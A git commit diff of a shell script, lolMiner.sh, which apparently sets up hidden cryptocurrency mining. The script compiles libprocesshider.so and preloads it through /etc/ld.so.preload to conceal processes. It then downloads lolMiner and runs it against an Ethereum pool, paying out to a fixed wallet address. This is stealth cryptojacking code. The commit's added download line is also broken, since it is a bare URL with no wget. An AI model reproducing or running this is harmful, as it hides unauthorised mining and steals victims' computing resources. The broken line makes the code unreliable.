0141111e363892ae2d4ff590662cf0e91543505a
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-11-26 10:09:52 +0200

    Update lolMiner.sh

--- lolMiner.sh
+++ lolMiner.sh
@@ -5,7 +5,7 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.15/lolMiner_v1.15.tar.gz
-tar -xvzf lolMiner_v1.15.tar.gz
-cd 1.15
+https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.16/lolMiner_v1.16a_Lin64.tar.gz
+tar -xvzf lolMiner_v1.16a_Lin64.tar.gz
+cd 1.16a
 ./lolMiner -a ETHASH --pool naw-eth.hiveon.net:24443 --tls on --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY
